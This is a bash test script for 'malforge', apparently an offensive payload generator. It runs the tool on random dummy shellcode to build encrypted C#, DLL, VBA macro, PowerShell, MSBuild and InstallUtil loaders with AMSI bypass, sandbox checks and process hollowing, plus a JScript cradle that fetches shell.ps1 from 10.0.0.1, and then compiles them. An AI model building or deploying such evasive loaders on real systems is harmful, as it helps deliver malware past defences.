#!/bin/bash
set -e

echo "[*] Starting Malforge Sandbox Simulation..."

# 1. Install malforge
echo "[*] Installing malforge..."
pip install . > /dev/null 2>&1

# 2. Prepare dummy shellcode
echo "[*] Generating dummy shellcode (sc.bin)..."
python3 -c "import os; open('sc.bin', 'wb').write(os.urandom(512))"

# 3. Simulation: Run README commands
echo "[*] Running README commands..."

# C# runner with XOR encryption
malforge -i sc.bin -f exe -e xor -o runner.cs
# from a raw .bin file, AES encrypted, with AMSI bypass
malforge -i sc.bin -f exe -e aes --amsi -o payload.cs
# chained encryption (XOR first, then AES)
malforge -i sc.bin -f exe -e xor,aes --amsi --sandbox -o chained.cs
# VBA macro
malforge -i sc.bin -f macro -e xor --amsi -o macro.vba
# process hollowing
malforge -i sc.bin -f hollow -e rc4 --sandbox -o hollow.cs
# DLL
malforge -i sc.bin -f dll -e xor -o payload.dll.cs
# PowerShell
malforge -i sc.bin -f ps1 -e aes -o runner.ps1
# MSBuild
malforge -i sc.bin -f msbuild -e xor -o payload.csproj
# InstallUtil
malforge -i sc.bin -f installutil -e caesar -o installutil.cs
# JScript cradle
malforge -f js --url http://10.0.0.1/shell.ps1 -o cradle.js
# Unencrypted runner (test fix)
malforge -i sc.bin -f exe -o unencrypted.cs

# 4. Validation: File Existence
echo "[*] Validating output files..."
FILES=("runner.cs" "payload.cs" "chained.cs" "macro.vba" "hollow.cs" "payload.dll.cs" "runner.ps1" "payload.csproj" "installutil.cs" "cradle.js" "unencrypted.cs")
for f in "${FILES[@]}"; do
    if [ ! -f "$f" ]; then
        echo "[-] ERROR: $f was not generated!"
        exit 1
    fi
    echo "[+] Found $f"
done

# 5. Compilation Check (C#)
echo "[*] Testing C# compilation with mcs..."

echo "[*] Compiling EXE runner..."
mcs -out:runner.exe runner.cs

echo "[*] Compiling AES runner with AMSI bypass..."
mcs -out:payload.exe payload.cs

echo "[*] Compiling Chained runner..."
mcs -out:chained.exe chained.cs

echo "[*] Compiling Hollow runner..."
mcs -out:hollow.exe hollow.cs

echo "[*] Compiling DLL..."
mcs -target:library -out:payload.dll payload.dll.cs

echo "[*] Compiling InstallUtil..."
mcs -target:library -out:installutil.dll installutil.cs

echo "[*] ALL TESTS PASSED SUCCESSFULLY!"
